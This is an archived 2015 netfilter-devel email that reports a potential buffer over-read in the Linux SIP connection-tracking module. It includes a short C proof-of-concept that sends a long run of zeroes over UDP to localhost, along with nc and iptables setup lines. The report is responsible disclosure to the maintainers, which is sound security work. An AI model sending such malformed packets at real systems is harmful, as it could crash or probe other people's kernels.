From: Alexey Dobriyan <adobriyan@gmail.com>
Subject: almost(?) hole in nf_conntrack_sip
Date: Wed, 18 Feb 2015 16:33:32 +0300
Message-ID: <CACVxJT_pw+BdSmVTYyQH1tRm3V8OiawX-5=8f3YMnQ-qPbFFLw@mail.gmail.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Cc: netfilter-devel <netfilter-devel@vger.kernel.org>
To: Patrick McHardy <kaber@trash.net>,
	Pablo Neira Ayuso <pablo@netfilter.org>
Return-path: <netfilter-devel-owner@vger.kernel.org>
Received: from mail-la0-f46.google.com ([209.85.215.46]:39019 "EHLO
	mail-la0-f46.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1750772AbbBRNde (ORCPT
	<rfc822;netfilter-devel@vger.kernel.org>);
	Wed, 18 Feb 2015 08:33:34 -0500
Received: by labgq15 with SMTP id gq15so1123642lab.6
        for <netfilter-devel@vger.kernel.org>; Wed, 18 Feb 2015 05:33:33 -0800 (PST)
Sender: netfilter-devel-owner@vger.kernel.org
List-ID: <netfilter-devel.vger.kernel.org>

There is a bug waiting to happen in SIP conntracking module.

Look at sip_help_udp() => process_sip_response() => simple_strtoul() sequence.

simple_strtoul() can consume infinite amount of characters because
it doesn't doesn't on overflow and read past end of buffer.
Passing long stream of zeroes works.

I wasted a lot of time trying to reproduce remote crash only to find out
that "struct skb_shared_info" is shipped at the end of data attached to skb
and thus acts like terminator (enough characters which are not 0-9).

In slab debug kernels simple_stroul() call definitely stops at poison byte
(easy to check).

So, the crash exists but masked(fully?) by skb internals.

Not knowing SIP protocol, I'm not sending a patch. :-)

Attaching my lame "reproducer" which sends string
"SIP/2.0 0000000000...0"

    Alexey

nc -u -l -p 5060
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p udp --dport 5060 -j ACCEPT

#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define N 70

int main(int argc, char *argv[])
{
        struct sockaddr_in addr;
        int fd;

        unsigned char *buf;

        buf = malloc(8 + N);
        memcpy(buf, "SIP/2.0 ", 8);
        memset(buf + 8, '0', N - 8);

        fd = socket(AF_INET, SOCK_DGRAM, 0);
        memset(&addr, 0, sizeof(struct sockaddr_in));
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(5060);

//      while (1) {
                sendto(fd, buf, N, 0, (struct sockaddr *)&addr,
sizeof(struct sockaddr_in));
//      }

        return 0;
}
